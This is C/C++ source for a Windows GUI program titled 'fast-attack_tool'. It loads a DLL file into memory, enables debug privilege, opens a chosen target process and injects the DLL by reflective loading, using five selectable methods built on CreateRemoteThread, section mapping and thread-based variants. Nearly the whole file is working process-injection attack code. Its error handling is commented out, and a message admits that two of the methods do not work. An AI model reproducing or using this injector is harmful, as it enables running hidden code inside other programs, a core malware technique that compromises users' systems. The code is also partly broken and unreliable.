#include "Form1.h"
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryR.h"


static DWORD dwLength = 0;
static LPVOID lpBuffer = NULL;
static const char* exportedFuncName = "ReflectiveLoader";

void init() {
	FILE* fp = NULL;
	TOKEN_PRIVILEGES priv = { 0 };
	HANDLE hToken = NULL;

	const char* cpDllFile = "InjecteeDLL.dll";


	fopen_s(&fp, cpDllFile, "rb");
	if (fp == NULL) {
		//printf("Error: file not found.\n");
		//exit(1);
	}

	fseek(fp, 0L, SEEK_END);
	dwLength = ftell(fp);
	fseek(fp, 0L, SEEK_SET);

	lpBuffer = malloc(dwLength);
	if (lpBuffer == NULL) {
		//printf("Error: cannot allocate heap.\n");
		//exit(1);
	}

	fread(lpBuffer, 1, dwLength, fp);
	fclose(fp);

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		{
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		}

		CloseHandle(hToken);
	}

	MessageBoxA(NULL, "#3 and #5 are not Working!", "fast-attack_tool", MB_OK);
}

void exiting() {

	if (lpBuffer)
		free(lpBuffer);

}

void attack(unsigned int pid, unsigned int tid, int method)
{
	HANDLE hFile = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;







	//if (argc != 5) {
	//	printf("usage: %s <injection_method> <dll> <exported_function_name> <pid>\n", argv[0]);
	//	printf("<exported_function_name>: Exported function name in DLL (function using __declspec(dllexport))\n");
	//	printf("\ninjection_method list (kind of LoadRemoteLibraryR):\n");
	//	printf("1. it uses CreateRemoteThread, VirtualAllocEx and WriteProcessMemory.\n");
	//	printf("2. it uses CreateRemoteThread, CreateFileMappingA, MapViewOfFile and PNtMapViewOfSection.\n");
	//	exit(0);
	//}





	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION 
		| PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == NULL) {
		//printf("Error: cannot open the target process.\n");
		//exit(1);
	}

	// using various method for alternative LoadLibrary API
	switch (method) {
	case 1:
		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 2:
		hModule = LoadRemoteLibraryR2(hProcess, lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 3:
		if (tid == 0) {
			MessageBoxA(NULL, "#3 requires Target TID!", "fast-attack_tool", MB_OK);
			break;
		}
		LoadRemoteLibraryR3(hProcess, tid , lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 4:
		if (tid == 0) {
			MessageBoxA(NULL, "#4 requires Target TID!", "fast-attack_tool", MB_OK);
			break;
		}
		LoadRemoteLibraryR4(hProcess, tid, lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	case 5:
		LoadRemoteLibraryR5(lpBuffer, dwLength, NULL, exportedFuncName);
		break;
	default:
		break;
	}

	//if (hModule == NULL) {
	//	printf("Error: cannot inject %s DLL file.\n", cpDllFile);
	//	//exit(1);
	//}

	//printf("Injected the %s DLL into process %d.\n", cpDllFile, pid);
	WaitForSingleObject(hModule, -1);

	if (hProcess)
		CloseHandle(hProcess);

}